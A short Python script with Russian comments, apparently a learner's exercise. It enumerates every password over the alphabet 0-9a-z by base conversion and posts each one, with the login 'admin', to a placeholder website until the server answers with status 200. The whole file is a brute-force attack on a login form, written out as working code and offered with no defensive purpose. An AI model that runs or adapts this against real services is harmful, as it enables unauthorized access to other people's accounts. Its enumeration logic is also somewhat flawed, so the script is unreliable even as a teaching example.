import requests

# response = requests.get('https://google.com')
# print(response.text)
# print()
# print()
# print(response.status_code) # если вернулось 200 код выполнен успешно


# '10'-> '16'  0123456789abcdef
# 0 -> 0
# 9 -> 9
# 10 -> a
# 11 -> b
# 15 -> f
# 16 -> 10
# 17 -> 11

# пишем алгаритм перебора поролей для нижестоящего алфавита
# alphabet = '0123456789abcdef'
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)


i = 0
length = 0

while True:  # цикл для перевода цифр и добавление результата в пароль
    # i 10 -> 16
    password = ''
    temp = i
    while temp > 0:
        c = temp // base
        r = temp % base
        password = alphabet[r] + password
        temp = c

    if len(password) < length:
        zeros_count = length - len(password)
        password = alphabet[0] * zeros_count + password

    print('length', length, i, password)
    response = requests.post('https://некий_сайт.com', json={'login': 'admin', 'password': password})
    if response.status_code == 200:
        print('SUCCES', password)
        break

    if password.count(alphabet[-1]) == length:  # Нужно чтобы не пропустить длину паролей, например трехзначных
        length += 1
        i = 0
    else:
        i += 1
